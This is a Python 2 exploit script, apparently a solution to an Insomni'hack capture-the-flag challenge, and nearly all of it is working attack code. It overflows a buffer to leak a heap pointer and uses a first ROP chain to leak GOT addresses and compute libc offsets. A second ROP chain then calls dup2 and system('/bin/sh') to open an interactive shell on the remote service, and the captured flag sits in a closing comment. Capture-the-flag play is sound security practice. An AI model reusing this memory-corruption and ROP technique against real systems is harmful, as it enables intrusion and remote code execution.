import telnetlib, sys, struct
from time import sleep
from socket import * 

local = False
if local:
	host = 'localhost'
	port = 5001
else:
	host = 'ssc.teaser.insomnihack.ch'
	port = 5001

connect = (host, port)
con=socket(AF_INET, SOCK_STREAM)
con.connect(connect)

def send(com, recv=True):
	sleep(0.1)
	con.send(com + "\n")
	sleep(0.1)
	if(recv):
		return con.recv(1024)
	else:
		return ""

def interact():
	sys.stdout.write("> ")
	sys.stdout.flush()
	con2 = telnetlib.Telnet()
	con2.sock=con
	con2.interact()

def add_to_pointer(addr, num):
	unpacked = struct.unpack("<Q", (addr+"\x00"*8)[:8])[0]
	return struct.pack("<Q", unpacked+num)


send("ROBOTS WILL BE FREE!")
send("a")
send("0")
send("b")

location = add_to_pointer(send("A"*203).split("T")[0][204:], 0)
encryption = add_to_pointer(location, -8)

print "leaking heap pointer..."

con.close()

################################ CONNECTION 2 ################################
connect = (host, port)
con=socket(AF_INET, SOCK_STREAM)
con.connect(connect)

xchg_rsp_rdi_ret = "\x00\x00\x00\x00\x00\x40\x0e\x65"[::-1]
pop_rsi_r15_ret = "\x00\x00\x00\x00\x00\x40\x17\x11"[::-1]
pop_rdi_ret = "\x00\x00\x00\x00\x00\x40\x17\x13"[::-1]

set_rdi_4 = (pop_rdi_ret+"\x00\x00\x00\x00\x00\x00\x00\x04"[::-1])
set_rsi_got = (pop_rsi_r15_ret+"\x00\x00\x00\x00\x00\x60\x20\xa0"[::-1]+"\x00\x00\x00\x00\x00\x60\x20\xa0"[::-1])
sendz = "\x00\x00\x00\x00\x00\x40\x0b\xe0"[::-1]

send("ROBOTS WILL BE FREE!")
send(set_rdi_4+set_rsi_got+sendz+"A"*8) #ROP chain 1
send("0")
send("def")
send("A"*204+encryption)


print "leaking GOT..."

con.send(xchg_rsp_rdi_ret)
leak = con.recv(100).encode("hex")
split_leak = [leak[i:i+16].decode("hex")[::-1].encode("hex") for i in range(0, len(leak), 16)]

if local:
	libc_base = add_to_pointer(split_leak[0].decode("hex")[::-1], -1080960)
	system = add_to_pointer(libc_base, 0x443d0)
	dup2 = add_to_pointer(libc_base, 0xf7b40)
	bin_sh = add_to_pointer(libc_base, 0x18c39d)
	
else:
	libc_base = add_to_pointer(split_leak[0].decode("hex")[::-1], -0x1077d0) #Offsets taken from baby chall
	system = add_to_pointer(libc_base, 0x45390)
	dup2 = add_to_pointer(libc_base, 0xf6d90)
	bin_sh = add_to_pointer(libc_base, 0x18c177)

print "libc:    0x" + libc_base.encode("hex")[::-1]
print "system:  0x" + system.encode("hex")[::-1]
print "bin_sh:  0x" + bin_sh.encode("hex")[::-1]
print "dup2:    0x" + dup2.encode("hex")[::-1]

pop_rsi = "\x00\x00\x00\x00\x00\x40\x17\x11"[::-1]
pop_rdi = "\x00\x00\x00\x00\x00\x40\x17\x13"[::-1]

call_system_bin_sh = (pop_rdi_ret+bin_sh)+system
call_dup2_4_1 = (pop_rdi+("\x00"*7+"\x04")[::-1])+(pop_rsi+("\x00"*7+"\x01")[::-1]+"A"*8)+dup2
call_dup2_4_0 = (pop_rdi+("\x00"*7+"\x04")[::-1])+(pop_rsi+("\x00"*7+"\x00")[::-1]+"A"*8)+dup2

con.close()

################################ CONNECTION 3 ################################
connect = (host, port)
con=socket(AF_INET, SOCK_STREAM)
con.connect(connect)

send("ROBOTS WILL BE FREE!")
send(call_dup2_4_1+call_dup2_4_0+call_system_bin_sh) #ROP chain 2
send("0")
send("def")
send("A"*204+encryption)

con.send(xchg_rsp_rdi_ret)

interact()

#cat flag
#INS{RealWorldFlawsAreTheBest}

